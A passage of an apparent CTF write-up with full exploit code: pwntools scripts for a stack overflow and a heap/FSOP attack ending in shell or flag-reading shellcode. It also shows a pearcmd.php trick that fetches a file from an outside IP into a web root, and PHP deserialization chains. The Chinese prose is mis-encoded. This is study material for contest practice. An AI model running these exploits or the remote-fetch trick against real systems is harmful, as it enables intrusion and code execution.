class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">strstr_plt=elf.plt[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line"><span class="comment"># payload=(p32(0x804D1a0)+p32(0x8049F77)+p32(0x804D010)).rjust(0x1040,b&#x27;a&#x27;)+p32(0x804D1A0+0x103c-8)+p32(0x80496A8)</span></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1040</span>+p32(<span class="number">0x804D1A0</span>+<span class="number">0x4000</span>-<span class="number">4</span>)+p32(<span class="number">0x80496A8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x4000</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(<span class="number">0x8049F77</span>)+p32(<span class="number">0x804D010</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u32(r.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">execve_addr=libc_base+libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0xcc9ab</span></span><br><span class="line">gadget2=<span class="number">0x145f43</span></span><br><span class="line">gadget3=<span class="number">0x145f44</span></span><br><span class="line">one_gadget=libc_base+gadget1</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0xece\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:5lnPP74OkC4N9U8smBU812Smk1XxvRBJ\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xe9c</span>+p32(execve_addr)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="dream"><a class="markdownIt-Anchor" href="#dream"></a> Dream</h3>
<p>è¯´æ˜¯dreamï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªlargebin attackï¼Œç„¶åUAFæ¼æ´ï¼Œå‡½æ•°åŠŸèƒ½è¿˜éƒ½æ¯”è¾ƒé½å…¨ã€‚ä¸»è¦æ˜¯å¼€å¯äº†æ²™ç®±ä¸èƒ½æ‹¿åˆ°shellï¼Œå¹¶ä¸”showå‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªåŠ å¯†çš„è¿‡ç¨‹ï¼Œæƒ³è¦æ³„éœ²æ•°æ®å¿…é¡»è¦å®Œæˆé€†å‘ï¼Œä¹‹åæˆ‘ä»¬ç›´æ¥åˆ©ç”¨qwbé‡Œé¢house of catçš„åšæ³•ï¼Œä¸€æ¬¡largebin attackæ”»å‡»malloc assertå³å¯å®ç°orwè¯»å–flagå¹¶æ³„éœ²ã€‚</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280(6).PNG" alt="1280X1280(6)"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/dream/dream&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">26422</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/æ¯”èµ›/ç¾ŠåŸæ¯/dream/dream&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to wake?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream do you want to show?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to make?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">payload,<span class="built_in">len</span></span>):</span><br><span class="line">   key = [<span class="number">9</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">   v9 = <span class="number">52</span> // <span class="built_in">len</span> + <span class="number">6</span></span><br><span class="line">   delta = <span class="number">0</span></span><br><span class="line">   delta -= v9 * <span class="number">0x61C88647</span></span><br><span class="line">   delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line">   bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(v9):</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>)[::-<span class="number">1</span>]:</span><br><span class="line">         fd = payload[i - <span class="number">1</span>]</span><br><span class="line">         payload[i] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">         payload[i] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">         bk = payload[i]</span><br><span class="line">      i -= <span class="number">1</span></span><br><span class="line">      fd = payload[<span class="built_in">len</span> - <span class="number">1</span>]</span><br><span class="line">      payload[<span class="number">0</span>] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">      payload[<span class="number">0</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">      bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">      delta += <span class="number">0x61C88647</span></span><br><span class="line">      delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">      v9-=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payloads=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x420</span>//<span class="number">4</span>):</span><br><span class="line">    payloads.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads=de(payloads,<span class="number">0x420</span>//<span class="number">4</span>)</span><br><span class="line">main_arena=(payloads[<span class="number">0</span>]+(payloads[<span class="number">1</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">96</span></span><br><span class="line">libc_base=main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stderr_addr=libc_base+libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">set_context=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>//<span class="number">4</span>):</span><br><span class="line">    payloads1.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads1=de(payloads1,<span class="number">0x400</span>//<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">heap_base=(payloads1[<span class="number">2</span>]+(payloads1[<span class="number">3</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload=p64(main_arena+<span class="number">96</span>)*<span class="number">2</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x410</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(heap_base&gt;&gt;<span class="number">12</span>)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stderr_addr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x438</span>+p64(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_io_addr=heap_base+<span class="number">0xad0</span> </span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(heap_base)         </span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xee0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)</span><br><span class="line">fake_IO_FILE +=p64(set_context)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1e4f80</span>+<span class="number">0x10</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">shellcode_addr=heap_base+<span class="number">0xee0</span>+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">frame.rsp = shellcode_addr+<span class="number">0x20</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x10000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">shellcode=asm(code)</span><br><span class="line">payload=<span class="built_in">bytes</span>(frame)[<span class="number">0x20</span>:].ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(shellcode_addr+<span class="number">0x28</span>)+shellcode</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4f0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="rce_me"><a class="markdownIt-Anchor" href="#rce_me"></a> rce_me</h3>
<p>æ‰«è¿›ç¨‹æ‰«åˆ°äº†è¿™ä¸ª</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(6).PNG" alt="1280X1280 (6)"></p>
<p>ç›´æ¥è¯»æ ¹ç›®å½•/flagï¼Œæ²¡æœ‰æƒé™ï¼Œåº”è¯¥æ˜¯éœ€è¦è¿æœ¨é©¬ææƒ</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(7).PNG" alt="1280X1280 (7)"></p>
<p>æ‰¾äº†ä¸€åœˆæ­»æ´»æ‰¾ä¸åˆ°å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œæœ€åè¦æ‹¿pearcmd.phpå»ä¸‹è½½æ–‡ä»¶ç„¶ååŒ…å«ï¼Œè¿‡æ»¤çš„å­—ç¬¦ä¸²å¯ä»¥urlç¼–ç ç»•è¿‡ã€‚</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/%70%65%61%72cmd.php&amp;+download+http://101.43.255.238/1.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(8).PNG" alt="img"></p>
<p>ä¸‹è½½æ–‡ä»¶ç›´æ¥åˆ°webç›®å½•æˆåŠŸ</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(9).PNG" alt="img"></p>
<p>åŒ…å«æ–‡ä»¶+èšå‰‘è¿æ¥+dateææƒ</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(10).PNG" alt="img"></p>
<h3 id="step_by_step-v3"><a class="markdownIt-Anchor" href="#step_by_step-v3"></a> step_by_step-v3</h3>
<p>popé“¾é¢˜ç›®ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è¦è·³åˆ°hinté‚£é‡Œå»ç»•è¿‡include_onceåŒ…å«æ–‡ä»¶ï¼Œä½†æ˜¯è¿‡æ»¤å¾ˆå¤šï¼ŒåŒ…å«ä¸è¿›å»ï¼Œç„¶åå°±çœ‹åˆ°<code>($this-&gt;y1)();</code>å¯ä»¥çœ‹phpinfoï¼Œç»“æœflagç›´æ¥å‡ºæ¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$y</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$y1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c1=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b1=<span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$y</span>-&gt;y1=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;cheng&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;c1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;bei&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;b1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;yang&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;y1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;b2&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(11).PNG" alt="1280X1280 (11)"></p>
<h3 id="safepop"><a class="markdownIt-Anchor" href="#safepop"></a> Safepop</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=[<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;p=<span class="string">&quot;getFlag&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="variable">$f</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot; Fun func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
